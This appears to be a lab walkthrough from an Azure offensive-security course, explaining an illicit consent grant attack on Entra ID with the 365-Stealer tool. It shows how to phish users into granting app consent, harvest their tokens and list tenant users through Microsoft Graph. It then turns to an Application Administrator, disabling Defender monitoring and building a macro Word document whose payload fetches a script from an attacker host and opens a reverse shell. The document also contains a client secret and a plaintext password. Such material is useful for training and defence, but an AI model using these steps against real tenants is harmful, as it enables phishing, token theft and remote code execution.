# Illicit Consent Grant attack



**Register an application**

Entra ID -> App Registrations and click on New registration

Enter  the Name of the application, choose 'Accounts in any organizational directory (Any Entra ID directory - Multitenant)'

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Go to the 'Certificates & Secrets' blade of the application you registered, create a new client secret and copy it before browsing away from the page.

<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

Finally, go to the 'API permissions' blade and add the 'user.read' and 'User.ReadBasic.All' for the Microsoft Graph.

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Go to the OverView blade and note Application (Client) ID

**Set the 365-stealer config using CLI**

```batch
C:\xampp\htdocs\365-Stealer>python 365-Stealer.py --set-config

[snip]


 Welcome to 365-Stealer Configuration.

 Client ID ==> e06c6a0c-27bc-433a-b06e-5ef5ab0530af
 Client Secret ==> am0ZV1a7xms6nW_AwMqAE~~kco1nNcBc.L
 Redirect Url ==> https://172.16.150.X/login/authorized
 Redirect Url After Stealing ==>
 Macros File Path ==>
 OneDrive Extensions ==>
 Delay ==> 1
[+] 365-Sealer Configuration set successfully!
[snip]

Run the tool:
C:\xampp\htdocs\365-Stealer>python 365-Stealer.py --run-app

[snip]

```

Connecting to MSGraph

```powershell
$Token =  'eyJ0eX..'
$URI = 'https://graph.microsoft.com/v1.0/users'

$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{
        'Authorization' = "Bearer $Token" 
    }
}
(Invoke-RestMethod @RequestParams).value 

```

### Consent and Permissions

* Applications can ask users for permissions to access their data. For example, for basic sign-in.
* If allowed, a normal user can grant consent only for "Low Impact" permissions. In all other cases, admin consent is required.
* GA, Application Administrator, Cloud Application Administrator and a custom role including 'permission to grant permissions to applications' can provide tenant wide consent.
* Consent policies can be set for all users
* Do not allow user consent
* Allow user consent for apps from verified publishers, for selected permissions - Only for "Low Impact" permissions for apps from same tenant and verified publisher.
* Allow user consents for all apps - Allows consent for apps from other tenants and unverified publishers for Low Impact permissions. (Default)
* Custom app consent policy.
* 'Allow user consent for all apps' is interesting and abusable!

**Consent and Permissions - Low Impact Permissions**

* Only the permissions that don't need admin consent can be classified as low impact.
* Permissions required for basic sign-in are openid, profile, email, `User.Read` and `offline_access`.
* That means, if an organization allows user consent for all apps, an employee can grant consent to an app to read the above from their profile.
* There are some very interesting low impact permissions. For example: `User.ReadBasic.All` that allows the app to read display name, first and last name, email address, open extensions and photo for all the users!

### Illicit Consent Grant

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/3d7e6138-63c1-42d7-94c9-f77ae6717fdb/9f1b36c9-f005-47b0-b60f-c24952cecc20/image.png)

* Register a Multitenant application `studentx` in `defcorpextcontractors` tenant.
* Provide the Redirect URI where you would like to receive tokens. In the lab, it will be the student VM[https://172.16.151.X/login/authorized](https://172.16.151.x/login/authorized) (or 172.16.150.X or 172.16.152.X depending on your location)
* Go to the 'Certificates & secrets' blade and create new Client secret. Copy the client secret before browsing away from the page.
* Go to the 'API permissions' blade and add the following Delegated permissions for Microsoft Graph: `user.read`, `User.ReadBasic.All`

> Note: In case we want to use Access tokens, following config is required - In the 'Authentication' option of the `studentx` app, check 'Access tokens (used for implicit flows)' and click on 'Save'. We will use Refresh token so no configuration is required.

**Phishing**

* We have user privilege access to the `defcorphq` tenant. Check if users are allowed to consent to apps.
* Use Azure Portal or the below command from the AzureAD Preview module: `(GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole`
* If the output of above is 'ManagePermissionGrantsForSelf.microsoftuser-default-legacy', that means users can consent for all apps!
* In a real assessment, we simply need to try to know.
* Let's use 365-stealer ([https://github.com/AlteredSecurity/365-Stealer](https://github.com/AlteredSecurity/365-Stealer)) to abuse the consent grant settings!
* Please note that the attack can be executed using the o365 toolkit ([https://github.com/mdsecactivebreach/o365-attack-toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)) as well. But due to some limitations in the lab, we are not using it.
* Run xampp Control Panel (Run as administrator) and start Apache on the student VM.
* Copy the '365-stealer' directory from C:\AzAD\Tools to C:\xampp\htdocs to capture tokens returned by Entra ID.
* Using the '365-Stealer Configuration' button , configure CLIENTID, REDIRECTURL and CLIENTSECRET
* Click on 'Run 365-Stealer' to run the tool.
* Browse to[https://localhost](https://localhost) using an incognito window and click on 'Read More' in the web page. This gives you the phishing link that is to be sent to the target.
* We need to find a way to send the link to targets. We can abuse applications that allow us to contact users in the target organization.
* We can find applications running on the `defcorphq` tenant by sub-domain recon.
* Use MicroBurst to find the applications. We can add permutations like career, hr, users, file, backup to the permuations.txt used by MicroBurst etc.

```powershell
. C:\\AzAD\\Tools\\MicroBurst\\Misc\\Invoke-EnumerateAzureSubDomains.ps1
Invoke-EnumerateAzureSubDomains -Base defcorphq -Verbose
```

* We can also assume that the[https://defcorphqcareer.azurewebsites.net](https://defcorphqcareer.azurewebsites.net) application is known as a contractor may have some existing knowledge of the target.

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/3d7e6138-63c1-42d7-94c9-f77ae6717fdb/cac02694-0e96-4b74-a9a8-1e0c11974079/image.png)

* Wait for couple of minutes and browse to [http://localhost:82/365-Stealer/yourvictims/](http://localhost:82/365-Stealer/yourvictims/) on the attacking machine to get tokens for victims who click on the phishing link.
* Use the access token with the Graph API to list other users in the tenant.
* Note that only the permissions that we requested earlier are available with the access token. We can list all the users thanks to `User.ReadBasic.All`

```powershell
$Token = 'eyJ0eXAiOiJK...'
$URI = '<https://graph.microsoft.com/v1.0/users>'

$RequestParams = @{
	Method = 'GET'
	Uri = $URI
	Headers = @{
		'Authorization' = "Bearer $Token"
	}
}

(Invoke-RestMethod @RequestParams).value
```

* We need to target an Application Administrator to grant consent for better permissions.
* Ideally, we have to target all the users. For the lab, we can use our earlier enumeration that Application Administrator role is assigned to [markdwalden@defcorphq.onmicrosoft.com](mailto:markdwalden@defcorphq.onmicrosoft.com)
* We need to register a new app (or modify existing one) and now request permissions that need admin consent - `mail.read`, `notes.read.all`, `mailboxsettings.readwrite`, `files.readwrite.all`, `mail.send`
* Generate a new link using 'Read More' on[https://localhost](https://localhost) and send an email to the user containing that link (Remember to change the client ID if you register a new application)
* Once the user simulation grants consent, we will get the access token of the application administrator.
* Using the access token of application administrator, we can use 365-stealer to upload macro infested doc files to the user's OneDrive.
* The user simulation will open these macro infested word files and execute the macro.
* A licensed version of Office 365 is available on 172.16.1.250 to create doc files

```powershell
$passwd = ConvertTo-SecureString "ForCreatingWordDocs@123" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("officevm\\administrator", $passwd)
$officeVM = New-PSSession -ComputerName 172.16.1.250 -Credential $creds
Enter-PSSession -Session $officeVM

Set-MpPreference -DisableRealtimeMonitoring $true 
IEX (New-Object Net.Webclient).downloadstring("<http://172.16.150.43:82/Out-Word.ps1>")
Out-Word -Payload "powershell iex (New-Object Net.Webclient).downloadstring('<http://172.16.150.43:82/Invoke-PowerShellTcp.ps1>');Power -Reverse -IPAddress 172.16.150.43 -Port 4444" -OutputFile student43.doc 
exit

Copy-Item -FromSession $officeVM -Path C:\\Users\\Administrator\\Documents\\student43.doc -Destination C:\\AzAD\\Tools\\student43.doc
```

* Start a listener on the student VM
* On the student VM, use 365-stealer webconsole or CLI to upload the doc to OneDrive of [MarkDWalden@defcorphq.onmicrosoft.com](mailto:MarkDWalden@defcorphq.onmicrosoft.com)

```bash
python C:\\xampp\\htdocs\\365-Stealer\\[365-Stealer.py](<http://365-stealer.py/>) --refresh-user [MarkDWalden@defcorphq.onmicrosoft.com](<mailto:MarkDWalden@defcorphq.onmicrosoft.com>) --upload C:\\AzAD\\Tools\\studentx.doc
```
